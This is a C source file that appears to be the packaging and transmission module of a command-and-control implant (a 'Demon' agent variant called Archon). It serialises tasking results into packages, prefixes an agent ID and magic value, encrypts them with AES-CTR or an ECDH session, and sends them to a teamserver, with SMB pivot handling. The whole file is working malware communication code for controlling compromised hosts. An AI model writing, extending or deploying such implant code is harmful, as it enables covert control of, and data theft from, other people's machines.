/* Import Core Headers */
#include <core/Package.h>
#include <core/MiniStd.h>
#include <core/Command.h>
#include <core/Transport.h>
#include <core/TransportSmb.h>

/* Import Crypto Header (enable CTR Mode) */
#define CTR    1
#define AES256 1
#include <crypt/AesCrypt.h>

#ifdef ARCHON_ECDH_MODE
#include <crypt/EcdhInit.h>
#endif

VOID Int64ToBuffer( PUCHAR Buffer, UINT64 Value )
{
    Buffer[ 7 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 6 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 5 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 4 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 3 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 2 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 1 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 0 ] = Value & 0xFF;
}

VOID Int32ToBuffer(
    OUT PUCHAR Buffer,
    IN  UINT32 Size
) {
    ( Buffer ) [ 0 ] = ( Size >> 24 ) & 0xFF;
    ( Buffer ) [ 1 ] = ( Size >> 16 ) & 0xFF;
    ( Buffer ) [ 2 ] = ( Size >> 8  ) & 0xFF;
    ( Buffer ) [ 3 ] = ( Size       ) & 0xFF;
}

VOID PackageAddInt32(
    _Inout_ PPACKAGE Package,
    IN     UINT32   Data
) {
    if ( ! Package ) {
        return;
    }

    Package->Buffer = Instance->Win32.LocalReAlloc(
            Package->Buffer,
            Package->Length + sizeof( UINT32 ),
            LMEM_MOVEABLE
    );

    Int32ToBuffer( Package->Buffer + Package->Length, Data );

    Package->Length += sizeof( UINT32 );
}

VOID PackageAddInt64( PPACKAGE Package, UINT64 dataInt )
{
    if ( ! Package ) {
        return;
    }

    Package->Buffer = Instance->Win32.LocalReAlloc(
            Package->Buffer,
            Package->Length + sizeof( UINT64 ),
            LMEM_MOVEABLE
    );

    Int64ToBuffer( Package->Buffer + Package->Length, dataInt );

    Package->Length += sizeof( UINT64 );
}

VOID PackageAddBool(
    _Inout_ PPACKAGE Package,
    IN     BOOLEAN  Data
) {
    if ( ! Package ) {
        return;
    }

    Package->Buffer = Instance->Win32.LocalReAlloc(
            Package->Buffer,
            Package->Length + sizeof( UINT32 ),
            LMEM_MOVEABLE
    );

    Int32ToBuffer( Package->Buffer + Package->Length, Data ? 1 : 0 );

    Package->Length += sizeof( UINT32 );
}

VOID PackageAddPtr( PPACKAGE Package, PVOID pointer )
{
    PackageAddInt64( Package, ( UINT64 ) pointer );
}

VOID PackageAddPad( PPACKAGE Package, PCHAR Data, SIZE_T Size )
{
    if ( ! Package )
        return;

    Package->Buffer = Instance->Win32.LocalReAlloc(
            Package->Buffer,
            Package->Length + Size,
            LMEM_MOVEABLE | LMEM_ZEROINIT
    );

    MemCopy( Package->Buffer + ( Package->Length ), Data, Size );

    Package->Length += Size;
}

VOID PackageAddBytes( PPACKAGE Package, PBYTE Data, SIZE_T Size )
{
    if ( ! Package ) {
        return;
    }

    PackageAddInt32( Package, Size );

    if ( Size )
    {
        Package->Buffer = Instance->Win32.LocalReAlloc(
            Package->Buffer,
            Package->Length + Size,
            LMEM_MOVEABLE | LMEM_ZEROINIT
        );

        MemCopy( Package->Buffer + Package->Length, Data, Size );

        Package->Length += Size;
    }
}

VOID PackageAddString( PPACKAGE package, PCHAR data )
{
    PackageAddBytes( package, (PBYTE) data, StringLengthA( data ) );
}

VOID PackageAddWString( PPACKAGE package, PWCHAR data )
{
    PackageAddBytes( package, (PBYTE) data, StringLengthW( data ) * 2 );
}

PPACKAGE PackageCreate( UINT32 CommandID )
{
    PPACKAGE Package = NULL;

    Package            = Instance->Win32.LocalAlloc( LPTR, sizeof( PACKAGE ) );
    Package->Buffer    = Instance->Win32.LocalAlloc( LPTR, sizeof( BYTE ) );
    Package->Length    = 0;
    Package->RequestID = Instance->CurrentRequestID;
    Package->CommandID = CommandID;
    Package->Encrypt   = TRUE;
    Package->Destroy   = TRUE;
    Package->Included  = FALSE;
    Package->Next      = NULL;

    return Package;
}

PPACKAGE PackageCreateWithMetaData( UINT32 CommandID )
{
    PPACKAGE Package = PackageCreate( CommandID );

    /* ARC-10: Archon header layout: size | agent_id | magic
     * The teamserver reads agent_id first (bytes 4-7) so it can look up the
     * per-agent expected magic before validating — and before AES decryption. */
    PackageAddInt32( Package, 0 );                           /* size (filled in on send) */
    PackageAddInt32( Package, Instance->Session.AgentID );   /* agent_id at bytes 4-7   */
    PackageAddInt32( Package, ARCHON_MAGIC_VALUE );          /* magic   at bytes 8-11   */
    PackageAddInt32( Package, Package->CommandID );
    PackageAddInt32( Package, Package->RequestID );

    return Package;
}

PPACKAGE PackageCreateWithRequestID( UINT32 CommandID, UINT32 RequestID )
{
    PPACKAGE Package = PackageCreate( CommandID );

    Package->RequestID = RequestID;

    return Package;
}

VOID PackageDestroy(
    IN PPACKAGE Package
) {
    PPACKAGE Pkg = Instance->Packages;

    if ( Package )
    {
        // make sure the package is not on the Instance->Packages list, avoid UAF
        while ( Pkg )
        {
            if ( Package == Pkg )
            {
                PUTS_DONT_SEND( "Package can't be destroyed, is on Instance->Packages list" )
                return;
            }

            Pkg = Pkg->Next;
        }

        if ( Package->Buffer )
        {
            MemSet( Package->Buffer, 0, Package->Length );
            Instance->Win32.LocalFree( Package->Buffer );
            Package->Buffer = NULL;
        }

        MemSet( Package, 0, sizeof( PACKAGE ) );
        Instance->Win32.LocalFree( Package );
        Package = NULL;
    }
}

/* Advance a 128-bit big-endian AES-CTR IV by Blocks counter positions.
 * The IV is 16 bytes with byte 0 as the most-significant byte.
 * Used to seek to the correct keystream offset for monotonic CTR mode. */
static VOID AdvanceIvByBlocks( PUINT8 Iv, UINT64 Blocks )
{
    UINT64 Lo;
    UINT64 Hi;
    UINT64 NewLo;

    if ( Blocks == 0 )
        return;

    /* Read the current 128-bit counter as two 64-bit big-endian halves.
     * Bytes 0-7 are the high half; bytes 8-15 are the low half. */
    Lo = ( (UINT64)Iv[ 8] << 56 ) | ( (UINT64)Iv[ 9] << 48 ) |
         ( (UINT64)Iv[10] << 40 ) | ( (UINT64)Iv[11] << 32 ) |
         ( (UINT64)Iv[12] << 24 ) | ( (UINT64)Iv[13] << 16 ) |
         ( (UINT64)Iv[14] <<  8 ) | ( (UINT64)Iv[15]       );
    Hi = ( (UINT64)Iv[ 0] << 56 ) | ( (UINT64)Iv[ 1] << 48 ) |
         ( (UINT64)Iv[ 2] << 40 ) | ( (UINT64)Iv[ 3] << 32 ) |
         ( (UINT64)Iv[ 4] << 24 ) | ( (UINT64)Iv[ 5] << 16 ) |
         ( (UINT64)Iv[ 6] <<  8 ) | ( (UINT64)Iv[ 7]       );

    /* Add Blocks to the low half; propagate carry to the high half. */
    NewLo = Lo + Blocks;
    if ( NewLo < Lo )
        Hi++;

    Iv[ 0] = (UINT8)( Hi    >> 56 ); Iv[ 1] = (UINT8)( Hi    >> 48 );
    Iv[ 2] = (UINT8)( Hi    >> 40 ); Iv[ 3] = (UINT8)( Hi    >> 32 );
    Iv[ 4] = (UINT8)( Hi    >> 24 ); Iv[ 5] = (UINT8)( Hi    >> 16 );
    Iv[ 6] = (UINT8)( Hi    >>  8 ); Iv[ 7] = (UINT8)( Hi          );
    Iv[ 8] = (UINT8)( NewLo >> 56 ); Iv[ 9] = (UINT8)( NewLo >> 48 );
    Iv[10] = (UINT8)( NewLo >> 40 ); Iv[11] = (UINT8)( NewLo >> 32 );
    Iv[12] = (UINT8)( NewLo >> 24 ); Iv[13] = (UINT8)( NewLo >> 16 );
    Iv[14] = (UINT8)( NewLo >>  8 ); Iv[15] = (UINT8)( NewLo       );
}

// used to send the demon's metadata
BOOL PackageTransmitNow(
    _Inout_ PPACKAGE Package,
    OUT    PVOID*   Response,
    OUT    PSIZE_T  Size
) {
    AESCTX AesCtx   = { 0 };
    UINT8  OffsetIv[ AES_BLOCKLEN ];
    BOOL   Success  = FALSE;
    UINT32 Padding  = 0;

    if ( Package )
    {
        if ( ! Package->Buffer ) {
            PUTS_DONT_SEND( "Package->Buffer is empty" )
            return FALSE;
        }

        // writes package length to buffer
        Int32ToBuffer( Package->Buffer, Package->Length - sizeof( UINT32 ) );

        if ( Package->Encrypt )
        {
            Padding = sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 );

            /* only add these on init or key exchange */
            if ( Package->CommandID == DEMON_INITIALIZE ) {
                Padding += 32 + 16;
            }

            /* Monotonic CTR: seek to the accumulated global block offset so
             * each packet uses a unique, non-overlapping keystream region.
             * DEMON_INITIALIZE is always at offset 0 (the teamserver decrypts
             * it from offset 0 using the raw key/IV from the plaintext prefix). */
            MemCopy( OffsetIv, Instance->Config.AES.IV, AES_BLOCKLEN );
            AdvanceIvByBlocks( OffsetIv, Instance->Config.AES.CtrBlockOffset );

            AesInit( &AesCtx, Instance->Config.AES.Key, OffsetIv );
            AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
        }

        if ( TransportSend( Package->Buffer, Package->Length, Response, Size ) ) {
            Success = TRUE;
        } else {
            PUTS_DONT_SEND("TransportSend failed!")
        }

        /* Advance the global CTR block offset after a successful send so the
         * next packet starts at the correct keystream position.  Skip this for
         * DEMON_INITIALIZE: the teamserver always decrypts INIT at block 0 and
         * registers the agent with ctr_block_offset = 0. */
        if ( Success && Package->Encrypt && Package->CommandID != DEMON_INITIALIZE ) {
            Instance->Config.AES.CtrBlockOffset +=
                ( (SIZE_T)( Package->Length - Padding ) + AES_BLOCKLEN - 1 ) / AES_BLOCKLEN;
        }

        if ( Package->Destroy ) {
            PackageDestroy( Package ); Package = NULL;
        } else if ( Package->Encrypt ) {
            /* Re-init with the same OffsetIv to restore the plaintext buffer. */
            AesInit( &AesCtx, Instance->Config.AES.Key, OffsetIv );
            AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
        }
    } else {
        PUTS_DONT_SEND( "Package is empty" )
        Success = FALSE;
    }

    return Success;
}

// don't transmit right away, simply store the package. Will be sent when PackageTransmitAll is called
VOID PackageTransmit(
    IN PPACKAGE Package
) {
    PPACKAGE List      = NULL;
    UINT32   RequestID = 0;
    UINT32   Length    = 0;

    if ( ! Package ) {
        return;
    }

#if TRANSPORT_SMB
        // if the package is larger than PIPE_BUFFER_MAX, discard it
        // TODO: support packet fragmentation

        // size + demon-magic + agent-id + command-id + request-id +
        // command-id + request-id + buffer-size + Package->Length
        if ( sizeof( UINT32 ) * 8 + Package->Length > PIPE_BUFFER_MAX )
        {
            PRINTF( "Trying to send a package that is 0x%x bytes long, which is longer than PIPE_BUFFER_MAX, discarding...\n", Package->Length )

            RequestID = Package->RequestID;
            Length    = Package->Length;

            // destroy the package
            if ( Package->Destroy ) {
                PackageDestroy( Package );
            }

            // notify the operator that a package was discarded
            Package = PackageCreateWithRequestID( DEMON_PACKAGE_DROPPED, RequestID );
            PackageAddInt32( Package, Length );
            PackageAddInt32( Package, PIPE_BUFFER_MAX );
        }
#endif

    if ( ! Instance->Packages )
    {
        Instance->Packages = Package;
    }
    else
    {
        // add the new package to the end of the list (to preserve the order)
        List = Instance->Packages;
        while ( List->Next ) {
            List = List->Next;
        }
        List->Next = Package;
    }
}

// transmit all stored packages in a single request
BOOL PackageTransmitAll(
    OUT    PVOID*   Response,
    OUT    PSIZE_T  Size
) {
    AESCTX   AesCtx  = { 0 };
    BOOL     Success = FALSE;
    UINT32   Padding = 0;
    PPACKAGE Package = NULL;
    PPACKAGE Pkg     = Instance->Packages;
    PPACKAGE Entry   = NULL;
    PPACKAGE Prev    = NULL;

#if TRANSPORT_SMB
    // SMB pivots don't need to send DEMON_COMMAND_GET_JOB
    // so if we don't having nothing to send, simply exit
    if ( ! Instance->Packages )
        return TRUE;
#endif

#ifdef ARCHON_ECDH_MODE
    /* ECDH session path: build a DemonMessage (all fields little-endian) from the
     * queued packages, seal it as an ECDH session packet, and decrypt the response.
     * This path completely replaces the AES-CTR GET_JOB path when ECDH is active. */
    if ( Instance->ECDH.Active ) {
        PPACKAGE Cur;
        SIZE_T   msg_len    = 0;
        PUINT8   msg_buf    = NULL;
        PUINT8   pkt_buf    = NULL;
        ei_size_t pkt_written = 0;
        PVOID    raw_resp   = NULL;
        SIZE_T   raw_rsize  = 0;
        BOOL     ecdh_ok    = FALSE;

        /* Mark all queued packages as included and compute DemonMessage payload size.
         * DemonMessage wire format per package: cmd_id(4 LE) | req_id(4 LE) | len(4 LE) | data */
        for ( Cur = Instance->Packages; Cur; Cur = Cur->Next ) {
            Cur->Included = TRUE;
            msg_len += 4 + 4 + 4 + (SIZE_T)Cur->Length;
        }

        /* Allocate +1 so LocalAlloc(LPTR,0) isn't called for an empty queue */
        msg_buf = (PUINT8)Instance->Win32.LocalAlloc( LPTR, msg_len + 1 );
        if ( msg_buf ) {
            PUINT8 cursor = msg_buf;

            for ( Cur = Instance->Packages; Cur; Cur = Cur->Next ) {
                UINT32 cmd = Cur->CommandID;
                UINT32 req = Cur->RequestID;
                UINT32 len = (UINT32)Cur->Length;
                cursor[0] = (UINT8)(cmd      ); cursor[1] = (UINT8)(cmd >>  8);
                cursor[2] = (UINT8)(cmd >> 16); cursor[3] = (UINT8)(cmd >> 24);
                cursor += 4;
                cursor[0] = (UINT8)(req      ); cursor[1] = (UINT8)(req >>  8);
                cursor[2] = (UINT8)(req >> 16); cursor[3] = (UINT8)(req >> 24);
                cursor += 4;
                cursor[0] = (UINT8)(len      ); cursor[1] = (UINT8)(len >>  8);
                cursor[2] = (UINT8)(len >> 16); cursor[3] = (UINT8)(len >> 24);
                cursor += 4;
                MemCopy( cursor, Cur->Buffer, Cur->Length );
                cursor += Cur->Length;
            }

            /* Seal as ECDH session packet: conn_id(16) | nonce(12) | ciphertext | tag(16) */
            pkt_buf = (PUINT8)Instance->Win32.LocalAlloc( LPTR, 16 + 12 + msg_len + 16 );
            if ( pkt_buf && ecdh_build_session_packet(
                    Instance->ECDH.ConnectionId,
                    Instance->ECDH.SessionKey,
                    (const ei_u8 *)msg_buf, (ei_size_t)msg_len,
                    (ei_u8 *)pkt_buf, &pkt_written,
                    ArchonEcdhRng ) ) {

                if ( TransportSend( pkt_buf, (SIZE_T)pkt_written, &raw_resp, &raw_rsize ) ) {
                    if ( raw_resp && raw_rsize >= (SIZE_T)ECDH_SESS_RESP_MIN ) {
                        /* Response: nonce(12) | ciphertext | tag(16); allocate upper-bound */
                        PUINT8 plain_buf = (PUINT8)Instance->Win32.LocalAlloc( LPTR, raw_rsize );
                        if ( plain_buf ) {
                            ei_size_t plain_len = 0;
                            if ( ecdh_open_session_response(
                                    Instance->ECDH.SessionKey,
                                    (const ei_u8 *)raw_resp, (ei_size_t)raw_rsize,
                                    (ei_u8 *)plain_buf, &plain_len ) ) {
                                if ( Response ) *Response = plain_buf;
                                if ( Size )     *Size     = (SIZE_T)plain_len;
                                ecdh_ok = TRUE;
                            } else {
                                Instance->Win32.LocalFree( plain_buf );
                            }
                        }
                    } else {
                        ecdh_ok = TRUE; /* empty response = no pending tasks */
                    }
                }
            }
            if ( pkt_buf ) Instance->Win32.LocalFree( pkt_buf );
            Instance->Win32.LocalFree( msg_buf );
        }

        /* Remove successfully sent packages from the queue (same logic as normal path) */
        Entry = Instance->Packages;
        Prev  = NULL;
        if ( ecdh_ok ) {
            while ( Entry ) {
                if ( Entry->Included ) {
                    if ( Entry == Instance->Packages ) {
                        Instance->Packages = Entry->Next;
                        if ( Entry->Destroy ) { PackageDestroy( Entry ); Entry = NULL; }
                        Entry = Instance->Packages;
                        Prev  = NULL;
                    } else if ( Prev ) {
                        Prev->Next = Entry->Next;
                        if ( Entry->Destroy ) { PackageDestroy( Entry ); Entry = NULL; }
                        Entry = Prev->Next;
                    }
                } else {
                    Prev  = Entry;
                    Entry = Entry->Next;
                }
            }
        } else {
            while ( Entry ) { Entry->Included = FALSE; Entry = Entry->Next; }
        }

        return ecdh_ok;
    }
#endif

    Package = PackageCreateWithMetaData( DEMON_COMMAND_GET_JOB );

    // add all the packages we want to send to the main package
    while ( Pkg )
    {
#if TRANSPORT_SMB
        // SMB pivots can't send packages greater than PIPE_BUFFER_MAX
        if ( Package->Length + sizeof( UINT32 ) * 3 + Pkg->Length > PIPE_BUFFER_MAX )
            break;
#endif

        PackageAddInt32( Package, Pkg->CommandID );
        PackageAddInt32( Package, Pkg->RequestID );
        PackageAddBytes( Package, Pkg->Buffer, Pkg->Length );
        Pkg->Included = TRUE;

        // make sure we don't send a package larger than DEMON_MAX_REQUEST_LENGTH
        if ( Package->Length > DEMON_MAX_REQUEST_LENGTH )
            break;

        Prev = Pkg;
        Pkg  = Pkg->Next;
    }

    // writes package length to buffer
    Int32ToBuffer( Package->Buffer, Package->Length - sizeof( UINT32 ) );

    /*
     *  Header:
     *  [ SIZE         ] 4 bytes
     *  [ Magic Value  ] 4 bytes
     *  [ Agent ID     ] 4 bytes
     *  [ COMMAND ID   ] 4 bytes
     *  [ Request ID   ] 4 bytes
    */
    Padding = sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 );

    // encrypt the package — seek to the monotonic CTR offset first
    {
        UINT8 OffsetIv[ AES_BLOCKLEN ];
        MemCopy( OffsetIv, Instance->Config.AES.IV, AES_BLOCKLEN );
        AdvanceIvByBlocks( OffsetIv, Instance->Config.AES.CtrBlockOffset );
        AesInit( &AesCtx, Instance->Config.AES.Key, OffsetIv );
    }
    AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );

    // send it
    if ( TransportSend( Package->Buffer, Package->Length, Response, Size ) ) {
        Success = TRUE;
    } else {
        PUTS_DONT_SEND("TransportSend failed!")
    }

    /* Advance the global CTR block offset after a successful send.
     * Skip for DEMON_INITIALIZE: the teamserver always decrypts INIT at block 0
     * and registers the agent with ctr_block_offset = 0, consistent with
     * the guard in PackageTransmitNow. */
    if ( Success && Package->CommandID != DEMON_INITIALIZE ) {
        Instance->Config.AES.CtrBlockOffset +=
            ( (SIZE_T)( Package->Length - Padding ) + AES_BLOCKLEN - 1 ) / AES_BLOCKLEN;
    }

    // decrypt the package
    AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );

    Entry = Instance->Packages;
    Prev  = NULL;

    if ( Success )
    {
        // the request worked, remove all the packages that were included

        while ( Entry )
        {
            if ( Entry->Included )
            {
                // is this the first entry?
                if ( Entry == Instance->Packages )
                {
                    // update the start of the list
                    Instance->Packages = Entry->Next;

                    // remove the entry if required
                    if ( Entry->Destroy ) {
                        PackageDestroy( Entry ); Entry = NULL;
                    }

                    Entry = Instance->Packages;
                    Prev  = NULL;
                }
                else
                {
                    if ( Prev )
                    {
                        // remove the entry from the list
                        Prev->Next = Entry->Next;

                        // remove the entry if required
                        if ( Entry->Destroy ) {
                            PackageDestroy( Entry ); Entry = NULL;
                        }

                        Entry = Prev->Next;
                    }
                    else
                    {
                        // wut? this shouldn't happen
                        PUTS_DONT_SEND( "Failed to cleanup packages list" )
                    }
                }
            }
            else
            {
                Prev  = Entry;
                Entry = Entry->Next;
            }
        }
    }
    else
    {
        // the request failed, mark all packages as not included for next time
        while ( Entry )
        {
            Entry->Included = FALSE;
            Entry           = Entry->Next;
        }
    }

    PackageDestroy( Package ); Package = NULL;

    return Success;
}

VOID PackageTransmitError(
    IN UINT32 ID,
    IN UINT32 ErrorCode
) {
    PPACKAGE Package = NULL;

    PRINTF_DONT_SEND( "Transmit Error: %d\n", ErrorCode );

    Package = PackageCreate( DEMON_ERROR );

    PackageAddInt32( Package, ID );
    PackageAddInt32( Package, ErrorCode );
    PackageTransmit( Package );
}

